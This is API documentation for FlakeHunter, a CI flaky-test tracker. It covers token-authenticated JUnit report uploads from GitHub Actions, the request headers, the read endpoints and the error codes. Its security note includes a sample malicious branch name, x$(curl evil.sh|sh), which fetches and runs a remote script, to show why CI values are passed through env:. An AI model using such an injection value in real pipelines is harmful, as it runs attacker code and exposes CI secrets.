# FlakeHunter API

How CI sends test reports to FlakeHunter, and the read endpoints the dashboard and the MCP server use. To run the API
itself, see [deployment.md](deployment.md).

The API is v2, under `/api/v2`. Its machine-readable contract is [openapi.v2.json](openapi.v2.json), also served
publicly at `/openapi.v2.json`, with a browsable page at `/docs/v2` (`/docs` redirects there). It is generated from
the routes (`bun run openapi:generate`) and CI fails if the committed copy is stale. v1, under `/api`, has been
removed (see [API v1](#api-v1-removed)).

The commands below are bash commands, run from the repository root (on Windows, use Git Bash).

## Uploading reports from CI

Instead of (or as well as) the webhook, CI can push a JUnit XML report straight to
`POST /api/v2/reports`. It authenticates with a per-repo upload token, so a leaked CI secret can only
write to its own repo.

Mint a token (printed once; store it as a CI secret, e.g. `FLAKEHUNTER_TOKEN`):

```bash
TOKEN_REPO_FULL_NAME=<owner>/<repo> bun run --env-file=apps/api/.env scripts/create-repo-token.ts
```

Revoke one (takes effect on its next request):

```bash
REVOKE_TOKEN=<token> bun run --env-file=apps/api/.env scripts/revoke-repo-token.ts
```

Upload from a GitHub Actions step, after your tests have written `junit.xml`:

```yaml
- name: Upload test report to FlakeHunter
  if: always()
  run: |
    gzip -c junit.xml | curl --fail-with-body -X POST "$FLAKEHUNTER_URL/api/v2/reports" \
      -H "Authorization: Bearer $FLAKEHUNTER_TOKEN" \
      -H "Content-Type: application/xml" \
      -H "Content-Encoding: gzip" \
      -H "X-FH-Run-Id: $FH_RUN_ID" \
      -H "X-FH-Run-Attempt: $FH_RUN_ATTEMPT" \
      -H "X-FH-Sha: $FH_SHA" \
      -H "X-FH-Branch: $FH_BRANCH" \
      -H "X-FH-Workflow: $FH_WORKFLOW" \
      --data-binary @-
  env:
    FLAKEHUNTER_URL: https://your-flakehunter-host
    FLAKEHUNTER_TOKEN: ${{ secrets.FLAKEHUNTER_TOKEN }}
    FH_RUN_ID: ${{ github.run_id }}
    FH_RUN_ATTEMPT: ${{ github.run_attempt }}
    FH_SHA: ${{ github.event.pull_request.head.sha || github.sha }}
    FH_BRANCH: ${{ github.head_ref || github.ref_name }}
    FH_WORKFLOW: ${{ github.workflow }}
```

Use the PR head SHA (as above), not the merge commit, so uploads line up with webhook data.

Every `${{ }}` value goes through `env:` and is used as a quoted shell variable, never pasted into the `run:` script.
Branch and workflow names are chosen by whoever pushes or opens the pull request, so a name like
``x$(curl evil.sh|sh)`` written straight into the script would run as a command and could read `FLAKEHUNTER_TOKEN`.

| Header | Required | Meaning |
| --- | --- | --- |
| `X-FH-Run-Id` | yes | CI run id; with the attempt and report key it makes the upload idempotent |
| `X-FH-Sha` | yes | 40-character commit SHA the tests ran against |
| `X-FH-Run-Attempt` | no (1) | A re-run is a new attempt, which is what lets a flake show up on one commit |
| `X-FH-Branch`, `X-FH-Workflow` | no | Stored on the run |
| `X-FH-Report-Key` | no (`default`) | Distinguishes several reports for one run (e.g. `unit`, `integration`) |
| `X-FH-CI-Source` | no (the host's own CI) | Which CI system ran the tests; see below |
| `X-FH-Timestamp` | no (now) | When the tests ran, ISO-8601 (not more than 5 minutes in the future). Stamps a new run and its results; use it for late uploads or seeded history |

Re-uploading the same CI source, run, attempt and report key is a no-op and returns `200` with the original
counts; a first upload returns `201`.

**CI source.** `X-FH-CI-Source` names the CI system that ran the tests, so its run ids cannot collide with another
system's on the same repository. Leave it out when the repository's host runs its own CI: an upload from GitHub
Actions for a GitHub repository (as above) defaults to `github_actions`, and is the same run as the webhook's. From
any other CI system that builds the repository, add it to the `curl` above:

```bash
  -H "X-FH-CI-Source: $FH_CI_SOURCE" \
```

The value must be one of the `ciSource` values in [openapi.v2.json](openapi.v2.json); anything else is a `400`.
Today those are `github_actions` and `gitlab_ci`; a repository registered with host `gitlab` defaults to `gitlab_ci`.

**Body size.** The XML may be up to 11 MB, measured after decompression. Send it gzip-compressed with
`Content-Encoding: gzip` (as above; reports shrink about tenfold). This matters when the API runs behind AWS
Lambda, which rejects any request body over about 6 MB (about 4.5 MB of raw data after base64), so an uncompressed
report above that size never reaches the API. `gzip` is the only encoding accepted; others get a `400`, and gzip
data that expands past 11 MB gets a `413`.

**Rate limit.** Uploads are limited per source IP and per token (default 120 a minute). Past the limit the API
answers `429` with a `Retry-After` header.

## Read endpoints

Read endpoints use the global `API_TOKEN` as the bearer token. `repo` is a numeric id or a path (`owner/name`,
or `group/sub/project` on hosts that nest), optionally prefixed with its host (`github:acme/widgets`). A path without a
host that matches repositories on more than one host is a `400` naming the hosts, and an unknown host is a `400`.
`since` is an ISO-8601 timestamp (default: 30 days ago). List endpoints take
`limit` (default 50, max 200) and `offset`, and return `{ data, page: { limit, offset, total } }`.

| Endpoint | Returns |
| --- | --- |
| `GET /api/v2/repos` | Registered repos (`id`, `host`, `fullName`, `owner`, `name`), ordered by name |
| `GET /api/v2/tests/flaky?repo=&since=&minRuns=` | Tests ranked by flake rate: commits where the test both passed and failed, divided by commits it ran on (skipped ignored; `minRuns` defaults to 5) |
| `GET /api/v2/tests/:id/history?since=&status=` | Newest-first results for one test, with run details (`run.ciRunId`, `run.ciSource`) |
| `GET /api/v2/tests/:id/failures` | The 50 most recent failed or errored results for one test, newest first, with failure message and run details (not paginated) |
| `GET /api/v2/repos/:id/summary?since=` | Totals for the dashboard: runs, tests, results, pass rate, flaky tests and flaky commits |

## Errors

Every error, in either version, has the same shape:

```json
{ "error": { "code": "validation_error", "message": "...", "details": [{ "path": "querystring.limit", "message": "..." }] }, "requestId": "req-1" }
```

Codes: `validation_error` (400), `unauthorized` (401), `not_found` (404), `payload_too_large` (413),
`invalid_report` (422), `rate_limited` (429, with `Retry-After`), `internal_error` (500). `details` appears only on validation errors.

## API v1 (removed)

v1 was the same API under `/api` (`POST /api/reports`, `GET /api/repos` and so on), with its contract at
`/openapi.json`. It was removed once the dashboard, the MCP server and flakehunter-airflow had moved to v2
([ADR 0012](decisions/0012-api-v2-alongside-v1.md)); its paths now return 404. Runs uploaded through v1 are still there
and show in v2.

To move a client, change the prefix to `/api/v2` and read `run.ciRunId` instead of `run.githubRunId`.
